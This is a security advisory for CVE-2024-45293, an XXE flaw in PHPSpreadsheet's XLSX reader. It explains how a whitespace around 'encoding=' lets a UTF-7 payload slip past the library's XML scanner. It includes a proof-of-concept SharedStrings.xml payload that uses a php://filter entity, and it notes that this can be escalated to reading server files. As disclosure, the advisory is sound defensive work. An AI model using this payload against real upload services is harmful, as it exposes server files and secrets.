# [H] XXE in PHPSpreadsheet's XLSX reader

## Summary
Severity: High
Advisory: GHSA-6hwr-6v2f-3m88
CVE: CVE-2024-45293
CWE: CWE-611
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-10-07
Source: https://github.com/advisories/GHSA-6hwr-6v2f-3m88
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.3.0
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.29.1
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.1
- Packagist: `phpoffice/phpexcel` — affected >=0

## Details
### Summary
The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. 

### Details
The security scan function in `src/PhpSpreadsheet/Reader/Security/XmlScanner.php` contains a flawed XML encoding check to retrieve the input file's XML encoding in the `toUtf8` function. 

The function searches for the XML encoding through a defined regex which looks for `encoding="*"` and/or `encoding='*'`, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. 

 ```
$patterns = [
            '/encoding="([^"]*]?)"/',
            "/encoding='([^']*?)'/",
];
```

This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the `=` in the attribute definition. 

### PoC

Needed:
- An Excel sheet (XLSX) with at least one cell containing a value.

Unzip the excel sheet, and modify the `xl/SharedStrings.xml` file with the following value (note the space after `encoding=`):

```
<?xml version="1.0" encoding= 'UTF-7' standalone="yes"?>
+ADw-!DOCTYPE abc [ ... ]>
```

#### Step-by-step

1. First off, the following string is encoded in base64:

```
<!ENTITY internal 'abc'  >" 
```

Resulting in:

```
PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K
```

2. The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.

```
<?xml version="1.0" encoding= 'UTF-7' standalone="yes"?>
+ADw-!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K" > %xxe;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"><si><t>&internal;</t></si></sst>
```

When this file is parsed by the library, the value `abc` should be in the original filled cell.

With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. 

### Impact
Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88
- https://nvd.nist.gov/vuln/detail/CVE-2024-45293
- https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c
- https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331
- https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf
- https://github.com/PHPOffice/PhpSpreadsheet
